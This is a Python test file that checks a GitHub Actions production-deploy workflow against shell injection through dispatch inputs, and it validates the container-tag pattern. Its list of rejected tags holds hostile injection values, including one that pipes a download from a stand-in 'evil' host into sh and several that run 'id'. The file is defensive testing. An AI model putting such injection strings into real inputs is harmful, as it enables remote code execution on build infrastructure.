"""deploy-prod.yml must not interpolate dispatch inputs into shell (#1910)."""

import re
from pathlib import Path

import yaml

WORKFLOW = Path(__file__).resolve().parents[2] / ".github" / "workflows" / "deploy-prod.yml"


def _build_step():
    data = yaml.safe_load(WORKFLOW.read_text())
    for step in data["jobs"]["build-and-deploy"]["steps"]:
        if step.get("name") == "Build & push images":
            return step
    raise AssertionError("build step missing")


def test_no_input_expression_in_any_run_block():
    data = yaml.safe_load(WORKFLOW.read_text())
    for step in data["jobs"]["build-and-deploy"]["steps"]:
        run = step.get("run", "")
        assert "github.event.inputs" not in run
        assert "github.repository_owner" not in run
        assert "github.sha" not in run


def test_version_tag_reaches_the_script_only_via_env():
    step = _build_step()
    assert "github.event.inputs.version_tag" in step["env"]["INPUT_VERSION_TAG"]


def _tag_pattern() -> re.Pattern:
    """The container-tag pattern the step itself enforces, read from the workflow so it cannot drift."""
    script = _build_step()["run"]
    match = re.search(r'\[\[ "\$TAG" =~ (\^\S+\$) \]\]', script)
    assert match, "tag validation missing from the build step"
    return re.compile(match.group(1))


def test_valid_tags_pass_and_hostile_tags_are_rejected():
    pattern = _tag_pattern()
    for good in ("v1.2.3", "release_2026-11", "a" * 40, "A", "0.1"):
        assert pattern.fullmatch(good), good
    for bad in ('x"; curl evil|sh; echo "', "$(id)", "a b", "-rf", ".hidden", "a/b", "`id`", "x\nid", "a" * 129, "tag\n"):
        assert not pattern.fullmatch(bad), bad


def test_an_empty_input_defaults_to_the_commit_sha_before_validation():
    script = _build_step()["run"]
    assert 'TAG="${INPUT_VERSION_TAG:-$COMMIT_SHA}"' in script
    assert script.index('TAG="${INPUT_VERSION_TAG:-$COMMIT_SHA}"') < script.index("=~")
